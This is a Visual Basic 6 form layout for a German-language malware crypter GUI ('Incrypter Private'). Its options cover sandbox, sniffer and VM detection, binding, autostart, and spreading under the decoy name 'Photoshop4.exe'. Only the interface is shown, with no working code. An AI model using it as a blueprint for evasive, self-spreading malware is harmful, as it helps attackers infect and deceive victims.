VERSION 5.00
Object = "{A8E5842E-102B-4289-9D57-3B3F5B5E15D3}#12.1#0"; "CODEJO~3.OCX"
Begin VB.Form frmMain 
   BorderStyle     =   3  'Fester Dialog
   Caption         =   "Incrypter Private for Deniis"
   ClientHeight    =   5610
   ClientLeft      =   45
   ClientTop       =   7890
   ClientWidth     =   7140
   FillStyle       =   0  'Ausgefüllt
   Icon            =   "frmMain.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   5610
   ScaleWidth      =   7140
   ShowInTaskbar   =   0   'False
   StartUpPosition =   2  'Bildschirmmitte
   Begin XtremeSuiteControls.TabControl TabControl1 
      Height          =   3975
      Left            =   -120
      TabIndex        =   0
      Top             =   1560
      Width           =   7335
      _Version        =   786433
      _ExtentX        =   12938
      _ExtentY        =   7011
      _StockProps     =   68
      Appearance      =   10
      Color           =   32
      ItemCount       =   4
      Item(0).Caption =   "Datei"
      Item(0).ControlCount=   1
      Item(0).Control(0)=   "TabControlPage1"
      Item(1).Caption =   "Datei optionen"
      Item(1).ControlCount=   1
      Item(1).Control(0)=   "TabControlPage2"
      Item(2).Caption =   "Erstelle"
      Item(2).ControlCount=   1
      Item(2).Control(0)=   "TabControlPage3"
      Item(3).Caption =   "Author"
      Item(3).ControlCount=   1
      Item(3).Control(0)=   "TabControlPage4"
      Begin XtremeSuiteControls.TabControlPage TabControlPage4 
         Height          =   3645
         Left            =   -69970
         TabIndex        =   4
         Top             =   300
         Visible         =   0   'False
         Width           =   7275
         _Version        =   786433
         _ExtentX        =   12832
         _ExtentY        =   6429
         _StockProps     =   1
         Page            =   3
         Begin XtremeSuiteControls.ListBox ListBox2 
            Height          =   3135
            Left            =   120
            TabIndex        =   53
            Top             =   120
            Width           =   7095
            _Version        =   786433
            _ExtentX        =   12515
            _ExtentY        =   5530
            _StockProps     =   77
            BackColor       =   -2147483643
            BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "Comic Sans MS"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Appearance      =   6
            UseVisualStyle  =   0   'False
         End
      End
      Begin XtremeSuiteControls.TabControlPage TabControlPage3 
         Height          =   3645
         Left            =   -69970
         TabIndex        =   3
         Top             =   300
         Visible         =   0   'False
         Width           =   7275
         _Version        =   786433
         _ExtentX        =   12832
         _ExtentY        =   6429
         _StockProps     =   1
         Page            =   2
         Begin XtremeSuiteControls.CheckBox CheckBox3 
            Height          =   255
            Left            =   2760
            TabIndex        =   62
            Top             =   2160
            Width           =   1575
            _Version        =   786433
            _ExtentX        =   2778
            _ExtentY        =   450
            _StockProps     =   79
            Caption         =   "Aktiviere Cloner"
            BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "Comic Sans MS"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            UseVisualStyle  =   -1  'True
         End
         Begin XtremeSuiteControls.GroupBox GroupBox9 
            Height          =   735
            Left            =   2760
            TabIndex        =   60
            Top             =   2520
            Width           =   4335
            _Version        =   786433
            _ExtentX        =   7646
            _ExtentY        =   1296
            _StockProps     =   79
            Caption         =   "Cloner"
            BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "Comic Sans MS"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Enabled         =   0   'False
            Appearance      =   6
            Begin XtremeSuiteControls.PushButton PushButton20 
               Height          =   255
               Left            =   2640
               TabIndex        =   63
               Top             =   240
               Width           =   1575
               _Version        =   786433
               _ExtentX        =   2778
               _ExtentY        =   450
               _StockProps     =   79
               Caption         =   "Durchsuchen"
               BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
                  Name            =   "Comic Sans MS"
                  Size            =   8.25
                  Charset         =   0
                  Weight          =   400
                  Underline       =   0   'False
                  Italic          =   0   'False
                  Strikethrough   =   0   'False
               EndProperty
               Appearance      =   6
               Picture         =   "frmMain.frx":57E2
            End
            Begin VB.TextBox txtSource 
               BeginProperty Font 
                  Name            =   "Comic Sans MS"
                  Size            =   8.25
                  Charset         =   0
                  Weight          =   400
                  Underline       =   0   'False
                  Italic          =   0   'False
                  Strikethrough   =   0   'False
               EndProperty
               Height          =   285
               Left            =   120
               TabIndex        =   61
               Text            =   "Dateipfad..."
               Top             =   240
               Width           =   2415
            End
         End
         Begin XtremeSuiteControls.PushButton PushButton15 
            Height          =   495
            Left            =   120
            TabIndex        =   59
            Top             =   2520
            Width           =   2415
            _Version        =   786433
            _ExtentX        =   4260
            _ExtentY        =   873
            _StockProps     =   79
            Caption         =   "Suche nach Updates"
            BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "Comic Sans MS"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Appearance      =   6
            Picture         =   "frmMain.frx":5BBA
         End
         Begin XtremeSuiteControls.PushButton PushButton19 
            Height          =   255
            Left            =   6720
            TabIndex        =   58
            Top             =   2160
            Width           =   375
            _Version        =   786433
            _ExtentX        =   661
            _ExtentY        =   450
            _StockProps     =   79
            Caption         =   "PushButton19"
            Appearance      =   6
            Picture         =   "frmMain.frx":5F80
         End
         Begin XtremeSuiteControls.ListBox ListBox1 
            Height          =   1575
            Left            =   120
            TabIndex        =   52
            Top             =   120
            Width           =   7095
            _Version        =   786433
            _ExtentX        =   12515
            _ExtentY        =   2778
            _StockProps     =   77
            BackColor       =   -2147483643
            BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "Comic Sans MS"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Appearance      =   6
            UseVisualStyle  =   0   'False
         End
         Begin XtremeSuiteControls.PushButton cmdExit 
            Height          =   495
            Left            =   120
            TabIndex        =   49
            Top             =   3000
            Width           =   2415
            _Version        =   786433
            _ExtentX        =   4260
            _ExtentY        =   873
            _StockProps     =   79
            Caption         =   "Beenden"
            BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "Comic Sans MS"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Appearance      =   6
            Picture         =   "frmMain.frx":6367
         End
         Begin XtremeSuiteControls.PushButton cmdBuild 
            Height          =   495
            Left            =   120
            TabIndex        =   34
            Top             =   2040
            Width           =   2415
            _Version        =   786433
            _ExtentX        =   4260
            _ExtentY        =   873
            _StockProps     =   79
            Caption         =   "OK"
            BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "Comic Sans MS"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            TextAlignment   =   0
            Appearance      =   6
            Picture         =   "frmMain.frx":6769
         End
      End
      Begin XtremeSuiteControls.TabControlPage TabControlPage2 
         Height          =   3645
         Left            =   -69970
         TabIndex        =   2
         Top             =   300
         Visible         =   0   'False
         Width           =   7275
         _Version        =   786433
         _ExtentX        =   12832
         _ExtentY        =   6429
         _StockProps     =   1
         Page            =   1
         Begin XtremeSuiteControls.GroupBox GroupBox10 
            Height          =   615
            Left            =   3120
            TabIndex        =   73
            Top             =   2880
            Width           =   3975
            _Version        =   786433
            _ExtentX        =   7011
            _ExtentY        =   1085
            _StockProps     =   79
            Caption         =   "Icon zum ändern"
            Enabled         =   0   'False
            Appearance      =   6
            Begin XtremeSuiteControls.PushButton PushButton22 
               Height          =   255
               Left            =   2400
               TabIndex        =   75
               Top             =   240
               Width           =   1455
               _Version        =   786433
               _ExtentX        =   2566
               _ExtentY        =   450
               _StockProps     =   79
               Caption         =   "Durchsuchen"
               Appearance      =   6
               Picture         =   "frmMain.frx":6B4F
            End
            Begin XtremeSuiteControls.FlatEdit FlatEdit1 
               Height          =   255
               Left            =   120
               TabIndex        =   74
               Top             =   240
               Width           =   2175
               _Version        =   786433
               _ExtentX        =   3836
               _ExtentY        =   450
               _StockProps     =   77
               BackColor       =   -2147483643
               Text            =   "Iconpfad..."
               Appearance      =   6
               UseVisualStyle  =   0   'False
            End
         End
         Begin XtremeSuiteControls.GroupBox GroupBox8 
            Height          =   615
            Left            =   4920
            TabIndex        =   66
            Top             =   2160
            Width           =   2175
            _Version        =   786433
            _ExtentX        =   3836
            _ExtentY        =   1085
            _StockProps     =   79
            Caption         =   "Spread Name"
            BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "Comic Sans MS"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Enabled         =   0   'False
            Appearance      =   6
            Begin XtremeSuiteControls.FlatEdit txtSpreadname 
               Height          =   255
               Left            =   120
               TabIndex        =   67
               Top             =   240
               Width           =   1935
               _Version        =   786433
               _ExtentX        =   3413
               _ExtentY        =   450
               _StockProps     =   77
               BackColor       =   -2147483643
               BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
                  Name            =   "Comic Sans MS"
                  Size            =   8.25
                  Charset         =   0
                  Weight          =   400
                  Underline       =   0   'False
                  Italic          =   0   'False
                  Strikethrough   =   0   'False
               EndProperty
               Text            =   "Photoshop4.exe"
               Appearance      =   6
               UseVisualStyle  =   0   'False
            End
         End
         Begin XtremeSuiteControls.GroupBox GroupBox7 
            Height          =   615
            Left            =   3120
            TabIndex        =   55
            Top             =   2160
            Width           =   1695
            _Version        =   786433
            _ExtentX        =   2990
            _ExtentY        =   1085
            _StockProps     =   79
            Caption         =   "Bytes"
            BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "Comic Sans MS"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Enabled         =   0   'False
            Appearance      =   6
            Begin XtremeSuiteControls.FlatEdit txtBytes 
               Height          =   255
               Left            =   120
               TabIndex        =   57
               Top             =   240
               Width           =   1455
               _Version        =   786433
               _ExtentX        =   2566
               _ExtentY        =   450
               _StockProps     =   77
               BackColor       =   -2147483643
               BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
                  Name            =   "Comic Sans MS"
                  Size            =   8.25
                  Charset         =   0
                  Weight          =   400
                  Underline       =   0   'False
                  Italic          =   0   'False
                  Strikethrough   =   0   'False
               EndProperty
               Text            =   "1000"
               Appearance      =   6
               UseVisualStyle  =   0   'False
            End
         End
         Begin XtremeSuiteControls.GroupBox GroupBox6 
            Height          =   615
            Left            =   3120
            TabIndex        =   33
            Top             =   1440
            Width           =   3975
            _Version        =   786433
            _ExtentX        =   7011
            _ExtentY        =   1085
            _StockProps     =   79
            Caption         =   "Datei zum einbinden"
            BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "Comic Sans MS"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Enabled         =   0   'False
            Appearance      =   6
            Begin XtremeSuiteControls.PushButton PushButton16 
               Height          =   255
               Left            =   2400
               TabIndex        =   51
               Top             =   240
               Width           =   1455
               _Version        =   786433
               _ExtentX        =   2566
               _ExtentY        =   450
               _StockProps     =   79
               Caption         =   "Durchsuchen"
               BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
                  Name            =   "Comic Sans MS"
                  Size            =   8.25
                  Charset         =   0
                  Weight          =   400
                  Underline       =   0   'False
                  Italic          =   0   'False
                  Strikethrough   =   0   'False
               EndProperty
               Appearance      =   6
               Picture         =   "frmMain.frx":6F27
            End
            Begin XtremeSuiteControls.FlatEdit txtBindFile 
               Height          =   255
               Left            =   120
               TabIndex        =   50
               Top             =   240
               Width           =   2175
               _Version        =   786433
               _ExtentX        =   3836
               _ExtentY        =   450
               _StockProps     =   77
               BackColor       =   -2147483643
               BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
                  Name            =   "Comic Sans MS"
                  Size            =   8.25
                  Charset         =   0
                  Weight          =   400
                  Underline       =   0   'False
                  Italic          =   0   'False
                  Strikethrough   =   0   'False
               EndProperty
               Text            =   "Dateipfad..."
               Appearance      =   6
               UseVisualStyle  =   0   'False
            End
         End
         Begin XtremeSuiteControls.GroupBox GroupBox5 
            Height          =   1335
            Left            =   3120
            TabIndex        =   25
            Top             =   0
            Width           =   3975
            _Version        =   786433
            _ExtentX        =   7011
            _ExtentY        =   2355
            _StockProps     =   79
            Caption         =   "Message"
            BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "Comic Sans MS"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Enabled         =   0   'False
            Appearance      =   6
            Begin VB.PictureBox Picture3 
               BorderStyle     =   0  'Kein
               Height          =   255
               Left            =   3480
               Picture         =   "frmMain.frx":72FF
               ScaleHeight     =   255
               ScaleWidth      =   375
               TabIndex        =   72
               Top             =   960
               Width           =   375
            End
            Begin VB.PictureBox Picture2 
               BorderStyle     =   0  'Kein
               Height          =   255
               Left            =   2280
               Picture         =   "frmMain.frx":76C8
               ScaleHeight     =   255
               ScaleWidth      =   375
               TabIndex        =   71
               Top             =   960
               Width           =   375
            End
            Begin VB.PictureBox Picture1 
               BorderStyle     =   0  'Kein
               Height          =   255
               Left            =   1200
               Picture         =   "frmMain.frx":7A9F
               ScaleHeight     =   255
               ScaleWidth      =   375
               TabIndex        =   70
               Top             =   960
               Width           =   375
            End
            Begin XtremeSuiteControls.RadioButton RadioExclamation 
               Height          =   255
               Left            =   3240
               TabIndex        =   32
               Top             =   960
               Width           =   375
               _Version        =   786433
               _ExtentX        =   661
               _ExtentY        =   450
               _StockProps     =   79
               BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
                  Name            =   "Comic Sans MS"
                  Size            =   8.25
                  Charset         =   0
                  Weight          =   400
                  Underline       =   0   'False
                  Italic          =   0   'False
                  Strikethrough   =   0   'False
               EndProperty
               Appearance      =   6
            End
            Begin XtremeSuiteControls.RadioButton RadioInformation 
               Height          =   255
               Left            =   2040
               TabIndex        =   31
               Top             =   960
               Width           =   375
               _Version        =   786433
               _ExtentX        =   661
               _ExtentY        =   450
               _StockProps     =   79
               BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
                  Name            =   "Comic Sans MS"
                  Size            =   8.25
                  Charset         =   0
                  Weight          =   400
                  Underline       =   0   'False
                  Italic          =   0   'False
                  Strikethrough   =   0   'False
               EndProperty
               Appearance      =   6
            End
            Begin XtremeSuiteControls.RadioButton RadioCritical 
               Height          =   255
               Left            =   960
               TabIndex        =   30
               Top             =   960
               Width           =   375
               _Version        =   786433
               _ExtentX        =   661
               _ExtentY        =   450
               _StockProps     =   79
               BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
                  Name            =   "Comic Sans MS"
                  Size            =   8.25
                  Charset         =   0
                  Weight          =   400
                  Underline       =   0   'False
                  Italic          =   0   'False
                  Strikethrough   =   0   'False
               EndProperty
               Appearance      =   6
            End
            Begin XtremeSuiteControls.FlatEdit txtText 
               Height          =   255
               Left            =   960
               TabIndex        =   29
               Top             =   600
               Width           =   2775
               _Version        =   786433
               _ExtentX        =   4895
               _ExtentY        =   450
               _StockProps     =   77
               BackColor       =   -2147483643
               BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
                  Name            =   "Comic Sans MS"
                  Size            =   8.25
                  Charset         =   0
                  Weight          =   400
                  Underline       =   0   'False
                  Italic          =   0   'False
                  Strikethrough   =   0   'False
               EndProperty
            End
            Begin XtremeSuiteControls.FlatEdit txtTitle 
               Height          =   255
               Left            =   960
               TabIndex        =   28
               Top             =   240
               Width           =   2775
               _Version        =   786433
               _ExtentX        =   4895
               _ExtentY        =   450
               _StockProps     =   77
               BackColor       =   -2147483643
               BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
                  Name            =   "Comic Sans MS"
                  Size            =   8.25
                  Charset         =   0
                  Weight          =   400
                  Underline       =   0   'False
                  Italic          =   0   'False
                  Strikethrough   =   0   'False
               EndProperty
            End
            Begin XtremeSuiteControls.Label Label2 
               Height          =   255
               Left            =   240
               TabIndex        =   27
               Top             =   600
               Width           =   495
               _Version        =   786433
               _ExtentX        =   873
               _ExtentY        =   450
               _StockProps     =   79
               Caption         =   "Text:"
               BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
                  Name            =   "Comic Sans MS"
                  Size            =   8.25
                  Charset         =   0
                  Weight          =   400
                  Underline       =   0   'False
                  Italic          =   0   'False
                  Strikethrough   =   0   'False
               EndProperty
            End
            Begin XtremeSuiteControls.Label Label1 
               Height          =   255
               Left            =   240
               TabIndex        =   26
               Top             =   240
               Width           =   495
               _Version        =   786433
               _ExtentX        =   873
               _ExtentY        =   450
               _StockProps     =   79
               Caption         =   "Title:"
               BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
                  Name            =   "Comic Sans MS"
                  Size            =   8.25
                  Charset         =   0
                  Weight          =   400
                  Underline       =   0   'False
                  Italic          =   0   'False
                  Strikethrough   =   0   'False
               EndProperty
            End
         End
         Begin XtremeSuiteControls.GroupBox GroupBox3 
            Height          =   3495
            Left            =   120
            TabIndex        =   11
            Top             =   0
            Width           =   2895
            _Version        =   786433
            _ExtentX        =   5106
            _ExtentY        =   6165
            _StockProps     =   79
            Caption         =   "Haupt Optionen"
            BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "Comic Sans MS"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Appearance      =   6
            Begin XtremeSuiteControls.PushButton PushButton21 
               Height          =   255
               Left            =   2400
               TabIndex        =   69
               Top             =   3120
               Width           =   375
               _Version        =   786433
               _ExtentX        =   661
               _ExtentY        =   450
               _StockProps     =   79
               Appearance      =   6
               Picture         =   "frmMain.frx":7E91
            End
            Begin XtremeSuiteControls.CheckBox chkIconChanger 
               Height          =   255
               Left            =   120
               TabIndex        =   68
               Top             =   3120
               Width           =   2055
               _Version        =   786433
               _ExtentX        =   3625
               _ExtentY        =   450
               _StockProps     =   79
               Caption         =   "Aktiviere Icon Changer"
               BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
                  Name            =   "Comic Sans MS"
                  Size            =   8.25
                  Charset         =   0
                  Weight          =   400
                  Underline       =   0   'False
                  Italic          =   0   'False
                  Strikethrough   =   0   'False
               EndProperty
               Appearance      =   6
            End
            Begin XtremeSuiteControls.PushButton PushButton18 
               Height          =   255
               Left            =   2400
               TabIndex        =   65
               Top             =   2880
               Width           =   375
               _Version        =   786433
               _ExtentX        =   661
               _ExtentY        =   450
               _StockProps     =   79
               Caption         =   "PushButton18"
               Appearance      =   6
               Picture         =   "frmMain.frx":8278
            End
            Begin XtremeSuiteControls.CheckBox chkspread 
               Height          =   255
               Left            =   120
               TabIndex        =   64
               Top             =   2880
               Width           =   2175
               _Version        =   786433
               _ExtentX        =   3836
               _ExtentY        =   450
               _StockProps     =   79
               Caption         =   "Aktiviere Spreading"
               BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
                  Name            =   "Comic Sans MS"
                  Size            =   8.25
                  Charset         =   0
                  Weight          =   400
                  Underline       =   0   'False
                  Italic          =   0   'False
                  Strikethrough   =   0   'False
               EndProperty
               Appearance      =   6
            End
            Begin XtremeSuiteControls.PushButton PushButton17 
               Height          =   255
               Left            =   2400
               TabIndex        =   56
               Top             =   2640
               Width           =   375
               _Version        =   786433
               _ExtentX        =   661
               _ExtentY        =   450
               _StockProps     =   79
               Caption         =   "PushButton17"
               Appearance      =   6
               Picture         =   "frmMain.frx":865F
            End
            Begin XtremeSuiteControls.CheckBox CheckBox1 
               Height          =   255
               Left            =   120
               TabIndex        =   54
               Top             =   2640
               Width           =   2055
               _Version        =   786433
               _ExtentX        =   3625
               _ExtentY        =   450
               _StockProps     =   79
               Caption         =   "Aktiviere Vergrößern"
               BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
                  Name            =   "Comic Sans MS"
                  Size            =   8.25
                  Charset         =   0
                  Weight          =   400
                  Underline       =   0   'False
                  Italic          =   0   'False
                  Strikethrough   =   0   'False
               EndProperty
               Appearance      =   6
            End
            Begin XtremeSuiteControls.PushButton PushButton10 
               Height          =   255
               Left            =   2400
               TabIndex        =   44
               Top             =   2400
               Width           =   375
               _Version        =   786433
               _ExtentX        =   661
               _ExtentY        =   450
               _StockProps     =   79
               Caption         =   "PushButton10"
               Appearance      =   6
               Picture         =   "frmMain.frx":8A46
            End
            Begin XtremeSuiteControls.PushButton PushButton9 
               Height          =   255
               Left            =   2400
               TabIndex        =   43
               Top             =   2160
               Width           =   375
               _Version        =   786433
               _ExtentX        =   661
               _ExtentY        =   450
               _StockProps     =   79
               Caption         =   "PushButton9"
               Appearance      =   6
               Picture         =   "frmMain.frx":8E2D
            End
            Begin XtremeSuiteControls.PushButton PushButton8 
               Height          =   255
               Left            =   2400
               TabIndex        =   42
               Top             =   1920
               Width           =   375
               _Version        =   786433
               _ExtentX        =   661
               _ExtentY        =   450
               _StockProps     =   79
               Caption         =   "PushButton8"
               Appearance      =   6
               Picture         =   "frmMain.frx":9214
            End
            Begin XtremeSuiteControls.PushButton PushButton7 
               Height          =   255
               Left            =   2400
               TabIndex        =   41
               Top             =   1680
               Width           =   375
               _Version        =   786433
               _ExtentX        =   661
               _ExtentY        =   450
               _StockProps     =   79
               Caption         =   "PushButton7"
               Appearance      =   6
               Picture         =   "frmMain.frx":95FB
            End
            Begin XtremeSuiteControls.PushButton PushButton6 
               Height          =   255
               Left            =   2400
               TabIndex        =   40
               Top             =   1440
               Width           =   375
               _Version        =   786433
               _ExtentX        =   661
               _ExtentY        =   450
               _StockProps     =   79
               Caption         =   "PushButton6"
               Appearance      =   6
               Picture         =   "frmMain.frx":99E2
            End
            Begin XtremeSuiteControls.PushButton PushButton5 
               Height          =   255
               Left            =   2400
               TabIndex        =   39
               Top             =   1200
               Width           =   375
               _Version        =   786433
               _ExtentX        =   661
               _ExtentY        =   450
               _StockProps     =   79
               Caption         =   "PushButton5"
               Appearance      =   6
               Picture         =   "frmMain.frx":9DC9
            End
            Begin XtremeSuiteControls.PushButton PushButton4 
               Height          =   255
               Left            =   2400
               TabIndex        =   38
               Top             =   960
               Width           =   375
               _Version        =   786433
               _ExtentX        =   661
               _ExtentY        =   450
               _StockProps     =   79
               Caption         =   "PushButton4"
               Appearance      =   6
               Picture         =   "frmMain.frx":A1B0
            End
            Begin XtremeSuiteControls.PushButton PushButton3 
               Height          =   255
               Left            =   2400
               TabIndex        =   37
               Top             =   720
               Width           =   375
               _Version        =   786433
               _ExtentX        =   661
               _ExtentY        =   450
               _StockProps     =   79
               Caption         =   "PushButton3"
               Appearance      =   6
               Picture         =   "frmMain.frx":A597
            End
            Begin XtremeSuiteControls.PushButton PushButton2 
               Height          =   255
               Left            =   2400
               TabIndex        =   36
               Top             =   480
               Width           =   375
               _Version        =   786433
               _ExtentX        =   661
               _ExtentY        =   450
               _StockProps     =   79
               Caption         =   "PushButton2"
               Appearance      =   6
               Picture         =   "frmMain.frx":A97E
            End
            Begin XtremeSuiteControls.PushButton PushButton1 
               Height          =   255
               Left            =   2400
               TabIndex        =   35
               Top             =   240
               Width           =   375
               _Version        =   786433
               _ExtentX        =   661
               _ExtentY        =   450
               _StockProps     =   79
               Caption         =   "PushButton1"
               Appearance      =   6
               Picture         =   "frmMain.frx":AD65
            End
            Begin XtremeSuiteControls.CheckBox chkAutostart 
               Height          =   255
               Left            =   120
               TabIndex        =   24
               Top             =   2400
               Width           =   1815
               _Version        =   786433
               _ExtentX        =   3201
               _ExtentY        =   450
               _StockProps     =   79
               Caption         =   "Aktiviere Autostart"
               BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
                  Name            =   "Comic Sans MS"
                  Size            =   8.25
                  Charset         =   0
                  Weight          =   400
                  Underline       =   0   'False
                  Italic          =   0   'False
                  Strikethrough   =   0   'False
               EndProperty
               Appearance      =   6
            End
            Begin XtremeSuiteControls.CheckBox chkBinder 
               Height          =   255
               Left            =   120
               TabIndex        =   23
               Top             =   2160
               Width           =   1695
               _Version        =   786433
               _ExtentX        =   2990
               _ExtentY        =   450
               _StockProps     =   79
               Caption         =   "Aktiviere Binder"
               BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
                  Name            =   "Comic Sans MS"
                  Size            =   8.25
                  Charset         =   0
                  Weight          =   400
                  Underline       =   0   'False
                  Italic          =   0   'False
                  Strikethrough   =   0   'False
               EndProperty
               Appearance      =   6
            End
            Begin XtremeSuiteControls.CheckBox chkFake 
               Height          =   255
               Left            =   120
               TabIndex        =   22
               Top             =   1920
               Width           =   1935
               _Version        =   786433
               _ExtentX        =   3413
               _ExtentY        =   450
               _StockProps     =   79
               Caption         =   "Aktiviere Message"
               BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
                  Name            =   "Comic Sans MS"
                  Size            =   8.25
                  Charset         =   0
                  Weight          =   400
                  Underline       =   0   'False
                  Italic          =   0   'False
                  Strikethrough   =   0   'False
               EndProperty
               Appearance      =   6
            End
            Begin XtremeSuiteControls.CheckBox chkVirtual 
               Height          =   255
               Left            =   120
               TabIndex        =   21
               Top             =   1680
               Width           =   1935
               _Version        =   786433
               _ExtentX        =   3413
               _ExtentY        =   450
               _StockProps     =   79
               Caption         =   "Erkenne Virtual´s"
               BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
                  Name            =   "Comic Sans MS"
                  Size            =   8.25
                  Charset         =   0
                  Weight          =   400
                  Underline       =   0   'False
                  Italic          =   0   'False
                  Strikethrough   =   0   'False
               EndProperty
               Appearance      =   6
            End
            Begin XtremeSuiteControls.CheckBox chkSniffer 
               Height          =   255
               Left            =   120
               TabIndex        =   20
               Top             =   1440
               Width           =   1815
               _Version        =   786433
               _ExtentX        =   3201
               _ExtentY        =   450
               _StockProps     =   79
               Caption         =   "Erkenne Sniffer"
               BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
                  Name            =   "Comic Sans MS"
                  Size            =   8.25
                  Charset         =   0
                  Weight          =   400
                  Underline       =   0   'False
                  Italic          =   0   'False
                  Strikethrough   =   0   'False
               EndProperty
               Appearance      =   6
            End
            Begin XtremeSuiteControls.CheckBox chkSandbox 
               Height          =   255
               Left            =   120
               TabIndex        =   16
               Top             =   1200
               Width           =   2055
               _Version        =   786433
               _ExtentX        =   3625
               _ExtentY        =   450
               _StockProps     =   79
               Caption         =   "Erkenne Sandboxes"
               BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
                  Name            =   "Comic Sans MS"
                  Size            =   8.25
                  Charset         =   0
                  Weight          =   400
                  Underline       =   0   'False
                  Italic          =   0   'False
                  Strikethrough   =   0   'False
               EndProperty
               Appearance      =   6
            End
            Begin XtremeSuiteControls.CheckBox chkEOF 
               Height          =   255
               Left            =   120
               TabIndex        =   15
               Top             =   960
               Width           =   1335
               _Version        =   786433
               _ExtentX        =   2355
               _ExtentY        =   450
               _StockProps     =   79
               Caption         =   "Sichere EOF"
               BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
                  Name            =   "Comic Sans MS"
                  Size            =   8.25
                  Charset         =   0
                  Weight          =   400
                  Underline       =   0   'False
                  Italic          =   0   'False
                  Strikethrough   =   0   'False
               EndProperty
               Appearance      =   6
            End
            Begin XtremeSuiteControls.CheckBox chkValidatePE 
               Height          =   255
               Left            =   120
               TabIndex        =   14
               Top             =   720
               Width           =   1575
               _Version        =   786433
               _ExtentX        =   2778
               _ExtentY        =   450
               _StockProps     =   79
               Caption         =   "Verschiebe EP"
               BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
                  Name            =   "Comic Sans MS"
                  Size            =   8.25
                  Charset         =   0
                  Weight          =   400
                  Underline       =   0   'False
                  Italic          =   0   'False
                  Strikethrough   =   0   'False
               EndProperty
               Appearance      =   6
            End
            Begin XtremeSuiteControls.CheckBox chkFixChecksum 
               Height          =   255
               Left            =   120
               TabIndex        =   13
               Top             =   480
               Width           =   2175
               _Version        =   786433
               _ExtentX        =   3836
               _ExtentY        =   450
               _StockProps     =   79
               Caption         =   "Korrigiere PE Checksum"
               BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
                  Name            =   "Comic Sans MS"
                  Size            =   8.25
                  Charset         =   0
                  Weight          =   400
                  Underline       =   0   'False
                  Italic          =   0   'False
                  Strikethrough   =   0   'False
               EndProperty
               Appearance      =   6
            End
            Begin XtremeSuiteControls.CheckBox chkRealignpe 
               Height          =   255
               Left            =   120
               TabIndex        =   12
               Top             =   240
               Width           =   1935
               _Version        =   786433
               _ExtentX        =   3413
               _ExtentY        =   450
